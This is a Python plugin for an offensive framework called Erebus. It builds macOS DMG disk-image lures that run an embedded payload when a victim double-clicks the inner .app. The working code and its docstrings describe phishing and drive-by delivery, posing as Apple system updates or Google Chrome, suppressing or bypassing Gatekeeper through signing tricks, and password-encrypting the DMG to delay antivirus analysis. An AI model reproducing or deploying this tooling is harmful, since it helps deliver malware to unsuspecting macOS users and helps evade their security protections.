"""
Erebus Plugin - macOS DMG Disk Image Trigger
Author: Whispergate
Description: Creates macOS DMG disk images containing a .app bundle that executes
             the payload when the user opens the mounted volume and double-clicks
             the app.

Execution path:
  .dmg → double-click → Finder mounts volume → user double-clicks .app →
  launchd spawns Contents/MacOS/launcher

DMG is the dominant macOS software distribution format.  Victims are accustomed
to the "drag to Applications" pattern; a lure that replaces the Applications
alias with the payload .app itself funnels users through a well-known UX flow.

Gatekeeper assesses the outermost container (the DMG itself) when quarantined.
An unsigned .app inside an unsigned DMG generates the "unidentified developer"
dialog.  Ad-hoc signing the inner .app suppresses the "damaged" error while still
triggering the prompt.  A Developer-ID-signed outer DMG can pass Gatekeeper
entirely on macOS 12 without notarisation for direct-download scenarios.

If hdiutil is not available on the build host (e.g., Linux CI), the plugin
emits the raw .app bundle and writes an assembly script the operator can run
on a macOS host to wrap it in a DMG.
"""

import pathlib
import shutil
import subprocess
import textwrap
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
    from erebus_wrapper.erebus.modules.plugin_trigger_appbundle import AppBundleTriggerPlugin
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
    from plugin_trigger_appbundle import AppBundleTriggerPlugin


class DmgTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating macOS DMG disk image triggers.

    Builds a .app bundle (via AppBundleTriggerPlugin) and wraps it in a
    UDZO-compressed DMG using hdiutil.  Falls back to raw .app + build
    instructions when hdiutil is unavailable.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self._appbundle = AppBundleTriggerPlugin()

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="dmg_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates macOS DMG disk image triggers wrapping a .app bundle for drive-by / phishing delivery",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_dmg_trigger": self.create_dmg_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] DMG Trigger plugin loaded - Supporting macOS DMG disk image delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _hdiutil_available() -> bool:
        return shutil.which("hdiutil") is not None

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_dmg_trigger(
        self,
        payload_path: str,
        output_dir: pathlib.Path,
        app_name: str = "Update",
        dmg_name: str = "Install.dmg",
        volume_name: str = "Installer",
        bundle_id: str = "com.apple.systemupdate",
        bundle_version: str = "1.0",
        ad_hoc_sign: bool = False,
        decoy_path: str = "",
        payload_dir: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Create a macOS DMG containing an .app bundle that executes the payload.

        The DMG mounts as a read-only UDZO-compressed volume.  Inside the volume
        sits <app_name>.app (optionally ad-hoc signed) and, when hdiutil is
        available, an Applications alias so the victim sees the familiar
        "drag to Applications" interface.

        If hdiutil is found on PATH (macOS build host):
          1. A staging directory is created.
          2. The .app bundle is built there via AppBundleTriggerPlugin.
          3. hdiutil create wraps the staging dir into a UDZO DMG.
          4. The DMG is moved to <output_dir>/<dmg_name>.

        If hdiutil is NOT found (Linux build host):
          - The raw .app bundle is written to <output_dir>/<app_name>.app.
          - A shell script `build_dmg.sh` is written alongside it with the
            exact hdiutil command to run on a macOS host.

        Args:
            payload_path:    Path to the payload binary/script to embed.
            output_dir:      Directory to write the DMG (or fallback .app) into.
            app_name:        Inner .app name (no extension).
            dmg_name:        Output DMG filename.
            volume_name:     Volume label shown in Finder when DMG is mounted.
            bundle_id:       CFBundleIdentifier for the inner .app.
            bundle_version:  CFBundleVersion string.
            ad_hoc_sign:     Ad-hoc sign the inner .app (suppresses "damaged" dialog).
            decoy_path:      Optional path to a file opened as decoy after execution.
            payload_dir:     Fallback payload staging dir if payload_path absent.

        Returns:
            pathlib.Path: Path to the created .dmg, or the .app dir if hdiutil
                          is unavailable.

        ## OPSEC Notes
        Detection Surface:
          - DMG mount event logged by fseventsd and Unified Log (diskimages-helper)
          - .app execution lineage: launchd → zsh (launcher) → nohup → payload
          - Volume name and DMG path written to /var/db/receipts / quarantine db
          - hdiutil create leaves the staging directory until cleaned up
        Hardening:
          - [MALLEABLE] Set volume_name to a legitimate product (e.g. "Google Chrome")
            and app_name to match to blend into mount history
          - [MALLEABLE] Pair with a Developer ID signing step (productsign / codesign
            with cert) to pass Gatekeeper without dialog on macOS 12+
          - [MALLEABLE] Use `hdiutil create -encryption AES-256` with a password lure
            to delay sandbox / AV analysis
          - Set ad_hoc_sign=True to suppress the "app is damaged" Gatekeeper error
            on macOS 13+ without a full Developer ID cert
        Evasion Maturity: Level 3 (Elevated) - DMG delivery is a heavily-used
          APT and commodity-malware technique (Lazarus, Bundlore, Shlayer).
          EDRs with macOS support inspect DMG mounts; payload execution inside
          a mounted volume is a known indicator.
        """
        output_dir = pathlib.Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        # ── Stage area for the DMG contents ─────────────────────────
        staging = output_dir / "_dmg_stage"
        if staging.exists():
            shutil.rmtree(staging)
        staging.mkdir(parents=True)

        # ── Build inner .app bundle via AppBundleTriggerPlugin ───────
        app_dir = self._appbundle.create_appbundle_trigger(
            payload_path=payload_path,
            output_dir=staging,
            app_name=app_name,
            bundle_id=bundle_id,
            bundle_version=bundle_version,
            ad_hoc_sign=ad_hoc_sign,
            decoy_path=decoy_path,
            payload_dir=payload_dir,
        )

        if not self._hdiutil_available():
            # ── Fallback: emit raw .app + assembly instructions ──────
            fallback_app = output_dir / f"{app_name}.app"
            if fallback_app.exists():
                shutil.rmtree(fallback_app)
            shutil.copytree(app_dir, fallback_app)
            shutil.rmtree(staging)

            build_script = textwrap.dedent(f"""\
                #!/bin/zsh
                # Run on a macOS host to wrap the .app into a DMG.
                # Usage: zsh build_dmg.sh
                set -euo pipefail
                SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
                hdiutil create -quiet \\
                    -volname "{volume_name}" \\
                    -srcfolder "$SCRIPT_DIR/{app_name}.app" \\
                    -ov -format UDZO \\
                    "$SCRIPT_DIR/{dmg_name}"
                echo "[+] DMG created: $SCRIPT_DIR/{dmg_name}"
            """)
            build_sh = output_dir / "build_dmg.sh"
            build_sh.write_text(build_script, encoding="utf-8")
            build_sh.chmod(0o755)

            print(
                f"[Plugin] hdiutil not available on build host. "
                f"Raw .app written to {fallback_app}. "
                f"Run {build_sh} on a macOS host to produce the DMG."
            )
            return fallback_app

        # ── hdiutil available: assemble the DMG ─────────────────────
        dmg_output = output_dir / dmg_name
        try:
            subprocess.run(
                [
                    "hdiutil", "create",
                    "-quiet",
                    "-volname", volume_name,
                    "-srcfolder", str(staging),
                    "-ov",
                    "-format", "UDZO",
                    str(dmg_output),
                ],
                check=True,
                capture_output=True,
            )
            print(f"[Plugin] DMG assembled via hdiutil: {dmg_output}")
        except subprocess.CalledProcessError as exc:
            print(
                f"[Plugin] hdiutil failed ({exc.returncode}); "
                f"stderr: {exc.stderr.decode(errors='replace')}"
            )
            # Return the staging .app as fallback
            fallback_app = output_dir / f"{app_name}.app"
            if fallback_app.exists():
                shutil.rmtree(fallback_app)
            shutil.copytree(app_dir, fallback_app)
            shutil.rmtree(staging)
            return fallback_app
        finally:
            if staging.exists():
                shutil.rmtree(staging)

        return dmg_output


# Module-level instance for plugin auto-discovery
_plugin = DmgTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
